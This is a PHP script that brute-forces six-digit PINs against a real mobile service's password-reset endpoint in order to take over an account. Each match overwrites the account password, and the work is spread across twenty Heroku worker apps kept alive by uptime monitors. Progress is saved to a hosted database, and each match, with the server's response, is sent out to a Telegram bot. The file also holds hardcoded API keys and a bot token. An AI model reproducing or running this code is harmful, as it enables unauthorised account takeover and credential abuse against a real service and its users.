<?php

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Mon, 26 Jul 1997 00:00:00 GMT");
header("Pragma: no-cache");
clearstatcache();
date_default_timezone_set("Asia/Calcutta");

$ch=curl_init();
curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-Type: application/x-www-form-urlencoded','Accept-Encoding: gzip','Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7','Cache-Control: no-cache','Accept-Language: de,en;q=0.7,en-us;q=0.3','Connection: close'));
curl_setopt($ch,CURLOPT_ENCODING,"gzip");
curl_setopt($ch,CURLOPT_USERAGENT,"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch,CURLOPT_HEADER,0);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);

curl_setopt($ch,CURLOPT_POST,0);
curl_setopt($ch,CURLOPT_URL,'https://api.mlab.com/api/1/databases/openhouse/collections/account?apiKey=bXOzYMlc15gzN7i2DXEWroMVk0vk7pfY');
$tokens=$cnt=json_decode(curl_exec($ch));
$token=$tokens[0]->_id;
$found=$tokens[0]->found;

if(isset($_GET['id'])){
//with id

curl_setopt($ch,CURLOPT_URL,'https://api.mlab.com/api/1/databases/openhouse/collections/passranges?apiKey=bXOzYMlc15gzN7i2DXEWroMVk0vk7pfY&q={"_id":"'.$_GET['id'].'"}');
$passrange=json_decode(curl_exec($ch));
$pass=$passrange[0]->pass;
$status=$passrange[0]->status;
$uprid=$passrange[0]->uprid;
$uprapiarr=array("u622026-4b534028f842276b90728b00","u622093-5c0d428157454b6f0b3fb7e5","u622096-7c27398a03d2188e47dcc1f3","u622099-eb69cef888ed080af10c02f2","u622102-0e3573d4894a8bd47d4c7cf8","u622106-f554ade0a2e97b7b9103330e","u622110-038c187f61f038f4bbfd48e3","u622111-6a3732808f58e955800b6c29","u622112-c34dbeb3ffd13aad3112bb43","u622113-e8ae3ef8ac39386abea8757c","u622115-dd5e650c64f3408a8c45d8e4","u622116-515b65898b5da657956403c3","u622120-46756aa1ae59d3be151f1bc8","u622121-b67c029ed789f9c76bca8b8a","u622123-398a316ddcd9971a21e30093","u622125-f81028625876a502508dbf80","u622126-297fab6d76f7759e32af581c","u622127-fc2d359d99ac9fff0e29e599","u622129-fc323cd742b2deac3a8e12f4","u622130-2c6eaf88930c56ab5361e361");
$uprapi=$uprapiarr[(($_GET['id']-1)%20)];
$sitearr=array("luckycse00","luckycse02","luckycse03","luckycse04","luckycse05","luckycse06","luckycse07","luckycse08","luckycse09","luckycse10","luckycse11","luckycse12","luckycse13","luckycse14","luckycse15","luckycse16","luckycse17","luckycse18","luckycse19","luckycse20");
$site=$sitearr[(($_GET['id']-1)%20)];

if($found=="0"){

if($status=="0"){
if($_GET['id']=="1"){
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => "https://api.uptimerobot.com/v2/newMonitor",CURLOPT_RETURNTRANSFER => true,CURLOPT_ENCODING => "",CURLOPT_MAXREDIRS => 10,CURLOPT_TIMEOUT => 30,CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS => "api_key=$uprapi&format=json&type=1&url=https%3A%2F%2F".$site.".herokuapp.com%2Findex.php%3Fid=".($_GET['id']+0)."&friendly_name=id".($_GET['id']+0),
  CURLOPT_HTTPHEADER => array("cache-control: no-cache","content-type: application/x-www-form-urlencoded"),
));
$response = curl_exec($curl);$err = curl_error($curl);curl_close($curl);
$uprid=json_decode($response)->monitor->id;
}

if($_GET['id']<=1000){
	
curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-Type: application/json','Accept-Encoding: gzip','Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7','Cache-Control: no-cache','Accept-Language: de,en;q=0.7,en-us;q=0.3','Connection: close'));
$pst='{"_id":"'.($_GET['id']+0).'","status":"1","pass":"'.sprintf("%06d",(($_GET['id']-1)*1000)).'","uprid":"'.$uprid.'"}';
curl_setopt($ch,CURLOPT_POSTFIELDS,$pst);
curl_setopt($ch,CURLOPT_URL,"https://api.mlab.com/api/1/databases/openhouse/collections/passranges?apiKey=bXOzYMlc15gzN7i2DXEWroMVk0vk7pfY");
echo curl_exec($ch);

if($_GET['id']<1000){
$uprapi=$uprapiarr[(($_GET['id']-0)%20)];
$site=$sitearr[(($_GET['id']-0)%20)];
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => "https://api.uptimerobot.com/v2/newMonitor",CURLOPT_RETURNTRANSFER => true,CURLOPT_ENCODING => "",CURLOPT_MAXREDIRS => 10,CURLOPT_TIMEOUT => 30,CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS => "api_key=$uprapi&format=json&type=1&url=https%3A%2F%2F".$site.".herokuapp.com%2Findex.php%3Fid=".($_GET['id']+1)."&friendly_name=id".($_GET['id']+1),
  CURLOPT_HTTPHEADER => array("cache-control: no-cache","content-type: application/x-www-form-urlencoded"),
));
$response = curl_exec($curl);$err = curl_error($curl);curl_close($curl);
$uprid=json_decode($response)->monitor->id;

curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-Type: application/json','Accept-Encoding: gzip','Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7','Cache-Control: no-cache','Accept-Language: de,en;q=0.7,en-us;q=0.3','Connection: close'));
$pst='{"_id":"'.($_GET['id']+1).'","status":"0","pass":"'.sprintf("%06d",(($_GET['id']-0)*1000)).'","uprid":"'.$uprid.'"}';
curl_setopt($ch,CURLOPT_POSTFIELDS,$pst);
curl_setopt($ch,CURLOPT_URL,"https://api.mlab.com/api/1/databases/openhouse/collections/passranges?apiKey=bXOzYMlc15gzN7i2DXEWroMVk0vk7pfY");
echo curl_exec($ch);
}//<1000
}//<=1000

}else if($status=="1"){
curl_setopt($ch,CURLOPT_POST,1);
for($i=0;$i<10;$i++){
//echo "activeToken=$token&pinNo=".sprintf("%06d",($pass+$i))."&newPassword=Don@1997";
curl_setopt($ch,CURLOPT_POSTFIELDS,"activeToken=$token&pinNo=".sprintf("%06d",($pass+$i))."&newPassword=Don@1997");
curl_setopt($ch,CURLOPT_URL,"https://openhouse.imimobile.com/ohindia/updatePinPassword.htm");
$cnt=curl_exec($ch);

if(strpos($cnt,"Invalid pin details")!==false){

}else{
$found=sprintf("%06d",($pass+$i));
curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-Type: application/json','Accept-Encoding: gzip','Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7','Cache-Control: no-cache','Accept-Language: de,en;q=0.7,en-us;q=0.3','Connection: close'));
$pst='{"_id":"'.$token.'","found":"'.sprintf("%06d",($pass+$i)).'"}';
curl_setopt($ch,CURLOPT_POSTFIELDS,$pst);
curl_setopt($ch,CURLOPT_URL,"https://api.mlab.com/api/1/databases/openhouse/collections/account?apiKey=bXOzYMlc15gzN7i2DXEWroMVk0vk7pfY");
curl_exec($ch);

curl_setopt($ch,CURLOPT_HEADER,1);
curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-Type: application/x-www-form-urlencoded','Accept-Encoding: gzip','Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7','Cache-Control: no-cache','Accept-Language: de,en;q=0.7,en-us;q=0.3','Connection: close'));
curl_setopt($ch,CURLOPT_URL,"https://api.telegram.org/bot523151186:AAH0_tWneKWeEiDkwUbuxZgpUedAOHMTD_k/sendMessage?chat_id=536224432&text=$cnt");
curl_exec($ch);
curl_setopt($ch,CURLOPT_HEADER,0);

curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-Type: application/x-www-form-urlencoded','Accept-Encoding: gzip','Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7','Cache-Control: no-cache','Accept-Language: de,en;q=0.7,en-us;q=0.3','Connection: close'));
curl_setopt($ch,CURLOPT_URL,"https://api.telegram.org/bot523151186:AAH0_tWneKWeEiDkwUbuxZgpUedAOHMTD_k/sendMessage?chat_id=536224432&text=".($pass+$i));
curl_exec($ch);

}

}//for

if($found=="0"){
if(sprintf("%06d",($pass+10))>($_GET['id']*1000)){
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => "https://api.uptimerobot.com/v2/deleteMonitor",CURLOPT_RETURNTRANSFER => true,CURLOPT_ENCODING => "",CURLOPT_MAXREDIRS => 10,CURLOPT_TIMEOUT => 30,CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS => "api_key=$uprapi&format=json&id=".$uprid."&type=1&url=https%3A%2F%2F".$site.".herokuapp.com%2Findex.php%3Fid=".($_GET['id']+0)."&friendly_name=id".($_GET['id']+0),
  CURLOPT_HTTPHEADER => array("cache-control: no-cache","content-type: application/x-www-form-urlencoded"),
));
$response = curl_exec($curl);$err = curl_error($curl);curl_close($curl);
	
curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-Type: application/json','Accept-Encoding: gzip','Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7','Cache-Control: no-cache','Accept-Language: de,en;q=0.7,en-us;q=0.3','Connection: close'));
$pst='{"_id":"'.($_GET['id']+0).'","status":"2","pass":"r","uprid":"'.$uprid.'"}';
curl_setopt($ch,CURLOPT_POSTFIELDS,$pst);
curl_setopt($ch,CURLOPT_URL,"https://api.mlab.com/api/1/databases/openhouse/collections/passranges?apiKey=bXOzYMlc15gzN7i2DXEWroMVk0vk7pfY");
echo curl_exec($ch);
}else{
curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-Type: application/json','Accept-Encoding: gzip','Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7','Cache-Control: no-cache','Accept-Language: de,en;q=0.7,en-us;q=0.3','Connection: close'));
$pst='{"_id":"'.$_GET['id'].'","pass":"'.sprintf("%06d",($pass+10)).'","status":"1","uprid":"'.$uprid.'"}';
curl_setopt($ch,CURLOPT_POSTFIELDS,$pst);
curl_setopt($ch,CURLOPT_URL,"https://api.mlab.com/api/1/databases/openhouse/collections/passranges?apiKey=bXOzYMlc15gzN7i2DXEWroMVk0vk7pfY");
echo curl_exec($ch);
}
}

}else if($status=="2"){


}//status

}else{
//found

$curl = curl_init(); 
curl_setopt_array($curl, array(
  CURLOPT_URL => "https://api.uptimerobot.com/v2/deleteMonitor",CURLOPT_RETURNTRANSFER => true,CURLOPT_ENCODING => "",CURLOPT_MAXREDIRS => 10,CURLOPT_TIMEOUT => 30,CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS => "api_key=$uprapi&format=json&id=".$uprid."&type=1&url=https%3A%2F%2F".$site.".herokuapp.com%2Findex.php%3Fid=".($_GET['id']+0)."&friendly_name=id".($_GET['id']+0),
  CURLOPT_HTTPHEADER => array("cache-control: no-cache","content-type: application/x-www-form-urlencoded"),
));
$response = curl_exec($curl);$err = curl_error($curl);curl_close($curl);

curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-Type: application/json','Accept-Encoding: gzip','Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7','Cache-Control: no-cache','Accept-Language: de,en;q=0.7,en-us;q=0.3','Connection: close'));
$pst='{"_id":"'.($_GET['id']+0).'","status":"2","pass":"f","uprid":"'.$uprid.'"}';
curl_setopt($ch,CURLOPT_POSTFIELDS,$pst);
curl_setopt($ch,CURLOPT_URL,"https://api.mlab.com/api/1/databases/openhouse/collections/passranges?apiKey=bXOzYMlc15gzN7i2DXEWroMVk0vk7pfY");
curl_exec($ch);

}//found

}else{
//without id
echo "Token : ".$token."<br>Found : ".$found;
}

curl_close($ch);
?>